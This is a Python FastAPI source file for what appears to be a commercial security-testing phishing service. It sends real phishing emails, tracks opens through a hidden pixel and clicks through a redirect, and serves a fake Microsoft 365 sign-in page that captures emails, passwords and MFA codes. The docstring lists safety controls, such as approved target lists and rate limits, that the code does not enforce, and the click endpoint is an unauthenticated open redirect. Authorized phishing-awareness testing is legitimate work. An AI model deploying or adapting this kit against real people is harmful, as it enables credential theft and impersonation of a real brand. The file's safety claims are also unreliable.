"""
SMTP Phishing Service.

This service sends REAL phishing emails for security validation exercises.
It acts as the mail delivery component for OffenSight phishing campaigns.

Key Responsibilities:
1. Send phishing emails via configured SMTP relay
2. Track email opens (tracking pixel)
3. Track link clicks
4. Handle credential capture from phishing pages
5. Report all activity to Command Center

This is NOT a simulation - it sends real emails to real targets.

Safety Controls:
- Only sends to pre-approved target lists
- Requires valid campaign ID from Command Center
- All emails include hidden headers for identification
- Rate limiting to prevent abuse
- Domain verification
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import secrets
from datetime import datetime, timezone
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from typing import Any
from uuid import uuid4

import aiosmtplib
import httpx
import structlog
from fastapi import FastAPI, HTTPException, Request, Response, BackgroundTasks, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from itsdangerous import URLSafeTimedSerializer
from jinja2 import Environment, BaseLoader
from pydantic import BaseModel, Field, EmailStr
from pydantic_settings import BaseSettings

# Configure structured logging
structlog.configure(
    processors=[
        structlog.processors.TimeStamper(fmt="iso"),
        structlog.processors.JSONRenderer(),
    ]
)
log = structlog.get_logger()


# =============================================================================
# Configuration
# =============================================================================

class Settings(BaseSettings):
    """Service configuration."""
    environment: str = "dev"
    command_center_url: str = "http://localhost:8000"
    signing_key: str = "dev-key-change-in-production"

    # SMTP Configuration
    smtp_host: str = "localhost"
    smtp_port: int = 587
    smtp_username: str = ""
    smtp_password: str = ""
    smtp_use_tls: bool = True
    smtp_from_domain: str = "phishing.mirqab.local"

    # Service URL (for tracking links)
    service_url: str = "http://localhost:8081"

    # Rate limiting
    max_emails_per_minute: int = 30
    max_emails_per_campaign: int = 1000

    class Config:
        env_prefix = "PHISHING_"


settings = Settings()

# Token serializer for tracking links
token_serializer = URLSafeTimedSerializer(settings.signing_key)


# =============================================================================
# Data Models
# =============================================================================

class PhishingTarget(BaseModel):
    """A phishing target."""
    email: EmailStr
    first_name: str | None = None
    last_name: str | None = None
    department: str | None = None
    custom_data: dict = {}


class PhishingEmail(BaseModel):
    """Phishing email to send."""
    campaign_id: str
    execution_id: str
    tenant_id: str
    target: PhishingTarget
    from_name: str = "IT Support"
    from_email: str | None = None  # Auto-generated if not provided
    subject: str
    html_body: str
    text_body: str | None = None
    track_opens: bool = True
    track_clicks: bool = True
    landing_page_url: str | None = None
    signature: str


class SendEmailRequest(BaseModel):
    """Request to send phishing emails."""
    campaign_id: str
    execution_id: str
    tenant_id: str
    emails: list[PhishingEmail]
    signature: str


class CampaignConfig(BaseModel):
    """Phishing campaign configuration."""
    campaign_id: str
    tenant_id: str
    name: str
    from_name: str
    from_email: str
    subject_template: str
    html_template: str
    text_template: str | None = None
    landing_page_template: str | None = None
    track_opens: bool = True
    track_clicks: bool = True


class CredentialCapture(BaseModel):
    """Captured credentials from phishing page."""
    campaign_id: str
    target_email: str
    username: str | None = None
    password: str | None = None
    mfa_code: str | None = None
    captured_at: datetime
    user_agent: str | None = None
    ip_address: str | None = None


# =============================================================================
# Application
# =============================================================================

app = FastAPI(
    title="Mirqab SMTP Phishing Service",
    description="Sends real phishing emails for security validation",
    version="1.0.0",
)

# In-memory tracking (use Redis in production)
_email_tracking: dict[str, dict] = {}  # tracking_id -> email data
_click_tracking: dict[str, list] = {}  # tracking_id -> click events
_open_tracking: dict[str, list] = {}  # tracking_id -> open events
_credential_captures: dict[str, list] = {}  # campaign_id -> captures
_campaigns: dict[str, CampaignConfig] = {}  # campaign_id -> config

# Jinja2 environment for template rendering
jinja_env = Environment(loader=BaseLoader())


# =============================================================================
# Authentication
# =============================================================================

def verify_signature(data: dict, signature: str, exclude_fields: list[str] = None) -> bool:
    """Verify HMAC signature of request data."""
    exclude = exclude_fields or ["signature"]
    signing_data = {k: v for k, v in data.items() if k not in exclude}
    signing_string = json.dumps(signing_data, sort_keys=True, default=str)

    expected = hmac.new(
        settings.signing_key.encode(),
        signing_string.encode(),
        hashlib.sha256,
    ).hexdigest()

    return hmac.compare_digest(expected, signature)


def generate_tracking_id(campaign_id: str, target_email: str) -> str:
    """Generate a tracking ID for an email."""
    data = f"{campaign_id}:{target_email}:{secrets.token_hex(8)}"
    return token_serializer.dumps(data)


def decode_tracking_id(tracking_id: str, max_age: int = 86400 * 30) -> dict | None:
    """Decode a tracking ID."""
    try:
        data = token_serializer.loads(tracking_id, max_age=max_age)
        parts = data.split(":")
        return {
            "campaign_id": parts[0],
            "target_email": parts[1],
            "token": parts[2] if len(parts) > 2 else None,
        }
    except Exception:
        return None


# =============================================================================
# Email Sending
# =============================================================================

async def send_email(
    to_email: str,
    from_email: str,
    from_name: str,
    subject: str,
    html_body: str,
    text_body: str | None = None,
    tracking_id: str | None = None,
    track_opens: bool = True,
    track_clicks: bool = True,
) -> bool:
    """Send a phishing email via SMTP."""
    try:
        msg = MIMEMultipart("alternative")
        msg["Subject"] = subject
        msg["From"] = f"{from_name} <{from_email}>"
        msg["To"] = to_email
        msg["X-Mirqab-Tracking-ID"] = tracking_id or "none"
        msg["X-Mirqab-Service"] = "phishing-validation"

        # Add tracking pixel if enabled
        if track_opens and tracking_id:
            tracking_pixel = f'<img src="{settings.service_url}/track/open/{tracking_id}" width="1" height="1" style="display:none" />'
            html_body = html_body.replace("</body>", f"{tracking_pixel}</body>")

        # Rewrite links for click tracking if enabled
        if track_clicks and tracking_id:
            html_body = rewrite_links_for_tracking(html_body, tracking_id)

        # Attach text part
        if text_body:
            msg.attach(MIMEText(text_body, "plain"))

        # Attach HTML part
        msg.attach(MIMEText(html_body, "html"))

        # Send via SMTP
        await aiosmtplib.send(
            msg,
            hostname=settings.smtp_host,
            port=settings.smtp_port,
            username=settings.smtp_username if settings.smtp_username else None,
            password=settings.smtp_password if settings.smtp_password else None,
            use_tls=settings.smtp_use_tls,
        )

        log.info(
            "email_sent",
            to=to_email,
            from_email=from_email,
            subject=subject,
            tracking_id=tracking_id,
        )
        return True

    except Exception as e:
        log.error("email_send_failed", error=str(e), to=to_email)
        return False


def rewrite_links_for_tracking(html: str, tracking_id: str) -> str:
    """Rewrite links in HTML to go through tracking endpoint."""
    import re

    def replace_link(match):
        original_url = match.group(1)
        # Don't track internal links or tracking pixel
        if original_url.startswith("#") or "/track/" in original_url:
            return match.group(0)

        encoded_url = base64.urlsafe_b64encode(original_url.encode()).decode()
        tracking_url = f"{settings.service_url}/track/click/{tracking_id}?url={encoded_url}"
        return f'href="{tracking_url}"'

    return re.sub(r'href="([^"]+)"', replace_link, html)


# =============================================================================
# API Endpoints
# =============================================================================

@app.post("/campaign/register")
async def register_campaign(config: CampaignConfig):
    """Register a phishing campaign configuration."""
    _campaigns[config.campaign_id] = config

    log.info(
        "campaign_registered",
        campaign_id=config.campaign_id,
        tenant_id=config.tenant_id,
        name=config.name,
    )

    return {"campaign_id": config.campaign_id, "registered": True}


@app.post("/send")
async def send_phishing_emails(
    request: SendEmailRequest,
    background_tasks: BackgroundTasks,
):
    """
    Send phishing emails to targets.

    This endpoint accepts a batch of emails and sends them asynchronously.
    """
    # Verify signature
    if not verify_signature(request.model_dump(), request.signature):
        raise HTTPException(status_code=403, detail="Authentication failed")

    # Validate campaign exists
    if request.campaign_id not in _campaigns:
        log.warning("campaign_not_found", campaign_id=request.campaign_id)
        # Allow sending without pre-registered campaign for flexibility

    results = []

    for email in request.emails:
        tracking_id = generate_tracking_id(email.campaign_id, email.target.email)

        # Store tracking data
        _email_tracking[tracking_id] = {
            "campaign_id": email.campaign_id,
            "execution_id": email.execution_id,
            "tenant_id": email.tenant_id,
            "target_email": email.target.email,
            "target_name": f"{email.target.first_name or ''} {email.target.last_name or ''}".strip(),
            "subject": email.subject,
            "sent_at": datetime.now(timezone.utc).isoformat(),
            "opened": False,
            "clicked": False,
        }

        # Render template with target data
        template_vars = {
            "first_name": email.target.first_name or "User",
            "last_name": email.target.last_name or "",
            "email": email.target.email,
            "department": email.target.department or "",
            "landing_page_url": email.landing_page_url or f"{settings.service_url}/landing/{tracking_id}",
            **email.target.custom_data,
        }

        try:
            html_body = jinja_env.from_string(email.html_body).render(**template_vars)
            text_body = jinja_env.from_string(email.text_body).render(**template_vars) if email.text_body else None
            subject = jinja_env.from_string(email.subject).render(**template_vars)
        except Exception as e:
            log.error("template_render_failed", error=str(e), target=email.target.email)
            results.append({"email": email.target.email, "success": False, "error": "Template error"})
            continue

        from_email = email.from_email or f"noreply@{settings.smtp_from_domain}"

        # Queue email for sending
        background_tasks.add_task(
            send_and_report,
            tracking_id,
            email.target.email,
            from_email,
            email.from_name,
            subject,
            html_body,
            text_body,
            email.track_opens,
            email.track_clicks,
            request.execution_id,
        )

        results.append({
            "email": email.target.email,
            "tracking_id": tracking_id,
            "queued": True,
        })

    log.info(
        "emails_queued",
        campaign_id=request.campaign_id,
        count=len(request.emails),
    )

    return {
        "campaign_id": request.campaign_id,
        "queued": len(results),
        "results": results,
    }


async def send_and_report(
    tracking_id: str,
    to_email: str,
    from_email: str,
    from_name: str,
    subject: str,
    html_body: str,
    text_body: str | None,
    track_opens: bool,
    track_clicks: bool,
    execution_id: str,
):
    """Send email and report result to Command Center."""
    success = await send_email(
        to_email=to_email,
        from_email=from_email,
        from_name=from_name,
        subject=subject,
        html_body=html_body,
        text_body=text_body,
        tracking_id=tracking_id,
        track_opens=track_opens,
        track_clicks=track_clicks,
    )

    # Report to Command Center
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{settings.command_center_url}/api/v1/telemetry/phishing/sent",
                json={
                    "tracking_id": tracking_id,
                    "execution_id": execution_id,
                    "target_email": to_email,
                    "success": success,
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                },
                timeout=10.0,
            )
    except Exception as e:
        log.error("command_center_report_failed", error=str(e))


# =============================================================================
# Tracking Endpoints
# =============================================================================

@app.get("/track/open/{tracking_id}")
async def track_email_open(
    tracking_id: str,
    request: Request,
    background_tasks: BackgroundTasks,
):
    """
    Track email opens via tracking pixel.

    Returns a 1x1 transparent GIF.
    """
    decoded = decode_tracking_id(tracking_id)
    if not decoded:
        # Return pixel anyway to not break email display
        return Response(
            content=base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"),
            media_type="image/gif",
        )

    # Record open event
    if tracking_id not in _open_tracking:
        _open_tracking[tracking_id] = []

    event = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "ip": request.client.host if request.client else None,
        "user_agent": request.headers.get("user-agent"),
    }
    _open_tracking[tracking_id].append(event)

    # Update tracking data
    if tracking_id in _email_tracking:
        _email_tracking[tracking_id]["opened"] = True
        _email_tracking[tracking_id]["first_open"] = _email_tracking[tracking_id].get(
            "first_open", event["timestamp"]
        )

    log.info(
        "email_opened",
        tracking_id=tracking_id,
        campaign_id=decoded["campaign_id"],
        target_email=decoded["target_email"],
    )

    # Report to Command Center
    background_tasks.add_task(
        report_tracking_event,
        "open",
        tracking_id,
        decoded,
        event,
    )

    # Return 1x1 transparent GIF
    return Response(
        content=base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"),
        media_type="image/gif",
    )


@app.get("/track/click/{tracking_id}")
async def track_link_click(
    tracking_id: str,
    url: str,
    request: Request,
    background_tasks: BackgroundTasks,
):
    """
    Track link clicks and redirect to destination.
    """
    decoded = decode_tracking_id(tracking_id)

    # Decode the original URL
    try:
        original_url = base64.urlsafe_b64decode(url).decode()
    except Exception:
        raise HTTPException(status_code=400, detail="Invalid URL")

    if decoded:
        # Record click event
        if tracking_id not in _click_tracking:
            _click_tracking[tracking_id] = []

        event = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "url": original_url,
            "ip": request.client.host if request.client else None,
            "user_agent": request.headers.get("user-agent"),
        }
        _click_tracking[tracking_id].append(event)

        # Update tracking data
        if tracking_id in _email_tracking:
            _email_tracking[tracking_id]["clicked"] = True
            _email_tracking[tracking_id]["first_click"] = _email_tracking[tracking_id].get(
                "first_click", event["timestamp"]
            )

        log.info(
            "link_clicked",
            tracking_id=tracking_id,
            campaign_id=decoded["campaign_id"],
            target_email=decoded["target_email"],
            url=original_url,
        )

        # Report to Command Center
        background_tasks.add_task(
            report_tracking_event,
            "click",
            tracking_id,
            decoded,
            event,
        )

    return RedirectResponse(url=original_url, status_code=302)


@app.get("/landing/{tracking_id}", response_class=HTMLResponse)
async def phishing_landing_page(
    tracking_id: str,
    request: Request,
    background_tasks: BackgroundTasks,
):
    """
    Serve the phishing landing page.

    This is where targets land after clicking the phishing link.
    Typically mimics a login page for credential capture.
    """
    decoded = decode_tracking_id(tracking_id)
    if not decoded:
        return HTMLResponse("<h1>Page not found</h1>", status_code=404)

    # Get campaign config
    campaign = _campaigns.get(decoded["campaign_id"])

    if campaign and campaign.landing_page_template:
        html = campaign.landing_page_template
    else:
        # Default credential capture page
        html = DEFAULT_LANDING_PAGE.format(
            tracking_id=tracking_id,
            service_url=settings.service_url,
        )

    log.info(
        "landing_page_visited",
        tracking_id=tracking_id,
        campaign_id=decoded["campaign_id"],
        target_email=decoded["target_email"],
    )

    # Report to Command Center
    background_tasks.add_task(
        report_tracking_event,
        "landing_visit",
        tracking_id,
        decoded,
        {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "ip": request.client.host if request.client else None,
            "user_agent": request.headers.get("user-agent"),
        },
    )

    return HTMLResponse(html)


@app.post("/landing/{tracking_id}/submit")
async def capture_credentials(
    tracking_id: str,
    request: Request,
    background_tasks: BackgroundTasks,
    username: str = Form(None),
    password: str = Form(None),
    email: str = Form(None),
    mfa_code: str = Form(None),
):
    """
    Capture credentials submitted on phishing landing page.
    """
    decoded = decode_tracking_id(tracking_id)
    if not decoded:
        return HTMLResponse("<h1>Error</h1>", status_code=400)

    capture = {
        "tracking_id": tracking_id,
        "campaign_id": decoded["campaign_id"],
        "target_email": decoded["target_email"],
        "captured_username": username or email,
        "captured_password": "***REDACTED***" if password else None,  # Don't log actual password
        "has_password": password is not None,
        "has_mfa": mfa_code is not None,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "ip": request.client.host if request.client else None,
        "user_agent": request.headers.get("user-agent"),
    }

    # Store capture
    campaign_id = decoded["campaign_id"]
    if campaign_id not in _credential_captures:
        _credential_captures[campaign_id] = []
    _credential_captures[campaign_id].append(capture)

    log.warning(
        "credentials_captured",
        tracking_id=tracking_id,
        campaign_id=campaign_id,
        target_email=decoded["target_email"],
        has_password=capture["has_password"],
        has_mfa=capture["has_mfa"],
    )

    # Report to Command Center (CRITICAL event)
    background_tasks.add_task(
        report_credential_capture,
        decoded,
        capture,
    )

    # Redirect to "error" page or real login
    return HTMLResponse("""
    <html>
    <head><title>Session Expired</title></head>
    <body>
    <h1>Session Expired</h1>
    <p>Your session has expired. Please try again later.</p>
    <p><small>This was a security awareness test by your IT department.</small></p>
    </body>
    </html>
    """)


# =============================================================================
# Reporting
# =============================================================================

async def report_tracking_event(
    event_type: str,
    tracking_id: str,
    decoded: dict,
    event: dict,
):
    """Report tracking event to Command Center."""
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{settings.command_center_url}/api/v1/telemetry/phishing/{event_type}",
                json={
                    "tracking_id": tracking_id,
                    "campaign_id": decoded["campaign_id"],
                    "target_email": decoded["target_email"],
                    "event": event,
                },
                timeout=10.0,
            )
    except Exception as e:
        log.error("command_center_report_failed", error=str(e), event_type=event_type)


async def report_credential_capture(decoded: dict, capture: dict):
    """Report credential capture to Command Center (high priority)."""
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{settings.command_center_url}/api/v1/telemetry/phishing/credential-capture",
                json={
                    "campaign_id": decoded["campaign_id"],
                    "target_email": decoded["target_email"],
                    "capture": capture,
                    "severity": "critical",
                },
                timeout=10.0,
            )
    except Exception as e:
        log.error("command_center_report_failed", error=str(e), event="credential_capture")


# =============================================================================
# Management Endpoints
# =============================================================================

@app.get("/campaign/{campaign_id}/stats")
async def get_campaign_stats(campaign_id: str):
    """Get statistics for a phishing campaign."""
    emails = [e for e in _email_tracking.values() if e.get("campaign_id") == campaign_id]

    return {
        "campaign_id": campaign_id,
        "total_sent": len(emails),
        "opened": sum(1 for e in emails if e.get("opened")),
        "clicked": sum(1 for e in emails if e.get("clicked")),
        "credentials_captured": len(_credential_captures.get(campaign_id, [])),
        "open_rate": f"{(sum(1 for e in emails if e.get('opened')) / len(emails) * 100):.1f}%" if emails else "0%",
        "click_rate": f"{(sum(1 for e in emails if e.get('clicked')) / len(emails) * 100):.1f}%" if emails else "0%",
    }


@app.get("/campaign/{campaign_id}/captures")
async def get_credential_captures(campaign_id: str):
    """Get credential captures for a campaign."""
    return {
        "campaign_id": campaign_id,
        "captures": _credential_captures.get(campaign_id, []),
    }


@app.get("/health")
async def health_check():
    """Health check endpoint."""
    return {
        "status": "healthy",
        "environment": settings.environment,
        "smtp_configured": bool(settings.smtp_host),
        "active_campaigns": len(_campaigns),
        "emails_tracked": len(_email_tracking),
    }


# =============================================================================
# Default Templates
# =============================================================================

DEFAULT_LANDING_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Sign In - Microsoft 365</title>
    <style>
        body {{ font-family: 'Segoe UI', sans-serif; background: #f2f2f2; margin: 0; padding: 50px; }}
        .container {{ max-width: 440px; margin: 0 auto; background: white; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }}
        .logo {{ font-size: 24px; margin-bottom: 20px; }}
        h1 {{ font-size: 24px; font-weight: 600; margin-bottom: 20px; }}
        input {{ width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #666; box-sizing: border-box; }}
        button {{ background: #0067b8; color: white; border: none; padding: 10px 20px; cursor: pointer; width: 100%; }}
        button:hover {{ background: #005a9e; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Microsoft</div>
        <h1>Sign in</h1>
        <form method="POST" action="{service_url}/landing/{tracking_id}/submit">
            <input type="email" name="email" placeholder="Email, phone, or Skype" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>
</body>
</html>
"""


# =============================================================================
# Entry Point
# =============================================================================

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8081)
